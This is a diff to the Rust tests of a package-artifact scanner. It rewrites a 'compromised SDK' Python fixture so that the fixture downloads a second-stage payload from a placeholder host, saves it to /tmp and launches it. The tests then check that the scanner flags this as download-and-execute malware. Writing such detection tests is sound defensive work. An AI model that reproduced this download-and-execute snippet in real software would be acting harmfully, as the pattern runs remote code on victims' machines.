@@ -272,22 +272,28 @@ fn wheel_capability_zip() -> Vec<u8> {
         .into_inner()
 }
 
-const CLEAN_SDK_CLIENT_FIXTURE: &[u8] = br#"import os
+const CLEAN_SDK_CLIENT_FIXTURE: &[u8] = br#"import subprocess
 import urllib.request
 
-api_url = os.getenv("SPINE_SDK_API_URL", "https://example.invalid/v1")
+api_url = "https://example.invalid/v1"
 
 def status():
     return urllib.request.urlopen(api_url + "/status")
+
+def render_version():
+    return subprocess.run(["printf", "sdk-helper"], check=False)
 "#;
 
 const COMPROMISED_SDK_CLIENT_FIXTURE: &[u8] = br#"import subprocess
 import urllib.request
 
 def _fetch_and_launch():
-    payload = urllib.request.urlopen("https://example.invalid/second-stage").read()
-    subprocess.run(["printf", "inert-second-stage"], check=False)
-    return payload
+    destination = "/tmp/inert-second-stage"
+    with urllib.request.urlopen("https://example.invalid/second-stage") as response:
+        with open(destination, "wb") as output:
+            output.write(response.read())
+    subprocess.Popen([destination])
+    return destination
 
 _fecth_and_launch()
 "#;
@@ -796,7 +802,7 @@ fn deterministic_python_artifact_detection_survives_wheel_and_sdist_product_spin
 }
 
 #[test]
-fn broken_second_stage_hook_retains_exact_network_process_capability_detection() {
+fn broken_second_stage_hook_retains_exact_staged_download_execute_detection() {
     let clean_root = TempRoot::new("whoathere-exact-spine-clean-sdk-wheel");
     let clean_report = inspect(
         &clean_root,
@@ -807,12 +813,20 @@ fn broken_second_stage_hook_retains_exact_network_process_capability_detection()
         (None, None),
     );
 
-    assert!(clean_report.observations.iter().any(|observation| {
+    for category in [
+        ArtifactFindingCategory::NetworkCapability,
+        ArtifactFindingCategory::ProcessExecution,
+    ] {
+        assert!(clean_report.observations.iter().any(|observation| {
+            observation.finding_kind == ExactArtifactFindingKindV1::DeterministicStatic(category)
+                && !observation.behavior_detection_eligible
+        }));
+    }
+    assert!(clean_report.observations.iter().all(|observation| {
         observation.finding_kind
-            == ExactArtifactFindingKindV1::DeterministicStatic(
-                ArtifactFindingCategory::EnvironmentExfiltrationCapability,
+            != ExactArtifactFindingKindV1::DeterministicStatic(
+                ArtifactFindingCategory::DownloadExecuteCapability,
             )
-            && !observation.behavior_detection_eligible
     }));
     assert!(clean_report
         .observations
@@ -892,14 +906,18 @@ fn broken_second_stage_hook_retains_exact_network_process_capability_detection()
             end_byte,
         } => (*start_byte as usize, *end_byte as usize),
     };
-    assert_eq!(
-        &COMPROMISED_SDK_CLIENT_FIXTURE[start..end],
-        b"subprocess.run("
-    );
-    assert_eq!(
-        selected_bytes_sha256,
-        &Sha256Digest::from_bytes(&COMPROMISED_SDK_CLIENT_FIXTURE[start..end])
-    );
+    let selected = &COMPROMISED_SDK_CLIENT_FIXTURE[start..end];
+    assert!(selected.starts_with(b"urllib.request.urlopen("));
+    for expected in [
+        b"open(destination, \"wb\")".as_slice(),
+        b"output.write(response.read())".as_slice(),
+        b"subprocess.Popen([destination]".as_slice(),
+    ] {
+        assert!(selected
+            .windows(expected.len())
+            .any(|window| window == expected));
+    }
+    assert_eq!(selected_bytes_sha256, &Sha256Digest::from_bytes(selected));
     assert_eq!(
         compromised_report.verdict,
         whoathere_runner::ExactArtifactVerdictV1::Malicious
@@ -908,7 +926,7 @@ fn broken_second_stage_hook_retains_exact_network_process_capability_detection()
         compromised_report.status,
         ExactArtifactDispositionV1::Findings
     );
-    assert!(compromised_report.behavior_detection_count > 0);
+    assert_eq!(compromised_report.behavior_detection_count, 1);
     assert!(!compromised_report.admission_authority);
     assert!(!compromised_report.observed_clean);
 }
